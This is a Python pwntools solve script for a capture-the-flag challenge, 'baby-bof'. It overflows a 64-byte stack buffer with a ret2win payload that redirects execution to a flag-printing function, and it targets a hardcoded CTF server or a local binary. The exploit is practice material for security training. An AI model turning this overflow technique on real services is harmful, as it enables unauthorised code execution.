#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Exploit for "baby-bof" (CTF PWN): ret2win
#
# Usage:
#   python3 solve_baby_bof.py                 # connects to remote by default
#   python3 solve_baby_bof.py --host HOST --port PORT
#   python3 solve_baby_bof.py --local ./challenge   # (optional) run locally if you have the binary & flag.txt
#
from pwn import *
import re
import argparse

# -------- Settings --------
DEFAULT_HOST = "ctf.ac.upt.ro"
DEFAULT_PORT = 9361

# Computed from the binary (not PIE):
#   vuln(): read(0, buf, 0x100) with buf at [rbp-0x40]  -> RIP offset = 64 + 8 = 72
#   win()  @ 0x401196 prints the contents of flag.txt
#   'ret' gadget to keep stack nicely aligned: 0x40127c (the 'ret' at end of vuln)
OFFSET = 72
ADDR_WIN = 0x401196
GADGET_RET = 0x40127c

def build_payload():
    """A simple ret2win chain: [padding][ret][win]."""
    return b"A"*OFFSET + p64(GADGET_RET) + p64(ADDR_WIN)

def recv_until_prompt(io):
    # Romanian prompt: "Spune ceva:"
    try:
        io.recvuntil(b"Spune ceva:")
    except EOFError:
        # Fallback: just continue
        pass

def parse_flag(blob: bytes):
    m = re.search(rb"ctf\{[^\r\n]*?\}", blob, flags=re.IGNORECASE)
    if m:
        return m.group(0).decode("utf-8", "replace")
    return None

def run_remote(host, port):
    io = remote(host, port)
    recv_until_prompt(io)
    io.send(build_payload())
    out = io.recvall(timeout=5) or b""
    fl = parse_flag(out)
    if fl:
        log.success(f"FLAG: {fl}")
    else:
        log.warn("Could not auto-detect a flag in output. Full output below:")
        print(out.decode("utf-8", "replace"))
    io.close()

def run_local(path):
    elf = context.binary = ELF(path)
    io = process([path])
    recv_until_prompt(io)
    io.send(build_payload())
    out = io.recvall(timeout=5) or b""
    fl = parse_flag(out)
    if fl:
        log.success(f"FLAG (local): {fl}")
    else:
        log.warn("Could not auto-detect a flag in output (local). Full output below:")
        print(out.decode("utf-8", "replace"))
    io.close()

def main():
    parser = argparse.ArgumentParser(description="Solve the baby-bof challenge (ret2win).")
    parser.add_argument("--host", default=DEFAULT_HOST, help="remote host")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="remote port")
    parser.add_argument("--local", metavar="PATH", help="run locally with provided binary")
    args = parser.parse_args()

    context.clear(arch="amd64")
    context.log_level = "info"

    if args.local:
        run_local(args.local)
    else:
        run_remote(args.host, args.port)

if __name__ == "__main__":
    main()